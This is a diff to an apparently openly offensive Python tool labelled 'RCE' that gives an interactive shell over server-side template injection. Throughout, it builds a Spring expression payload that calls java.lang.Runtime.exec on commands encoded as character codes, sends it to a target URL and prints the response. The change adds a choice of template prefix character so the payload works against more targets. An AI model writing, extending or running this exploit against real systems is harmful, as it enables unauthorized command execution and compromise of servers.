@@ -7,12 +7,15 @@ parser = argparse.ArgumentParser(description="RCE.")
 parser.add_argument("-t", "--target",metavar="",required=True,help="Target to give an STI")
 parser.add_argument("-u","--url-encode", action="store_true", help="URL Encode")
 parser.add_argument("-d","--debug", action="store_true",default=False, help="Print debug")
+parser.add_argument("-c","--prefix-character", default='$', const='$', nargs='?', choices=('$', '#', '*'), help="Character that prefixes the template code (default: '%(default)c')")
+
 args = parser.parse_args()
 
 
 url_encode=args.url_encode
 target=args.target
 DEBUG=args.debug
+prefix_char=args.prefix_character
 
 def yellow(string):
 	return '\033[1;33m%s\033[0m' % string
@@ -36,8 +39,7 @@ class Terminal(Cmd):
 		for i in command:
 			decimals.append(str(ord(i)))
 
-		payload='''${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)''' % decimals[0]
-		
+		payload=f'{prefix_char}{{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString({decimals[0]})'
 
 		for i in decimals[1:]:
 			line='.concat(T(java.lang.Character).toString({}))'.format(i)
@@ -66,9 +68,9 @@ class Terminal(Cmd):
 			response=requests.get(url, headers=headers)
 			output=response.text
 			#The next line is used to parse out the output, this might be clean but it also may need work. Depends on the vuln.
-			
-			# ssti=str(output).split('&#39;')[1].rstrip() 
-			
+
+			# ssti=str(output).split('&#39;')[1].rstrip()
+
 			print (output)
 		except:
 			print('Unable to send command: %s' % yellow(args))
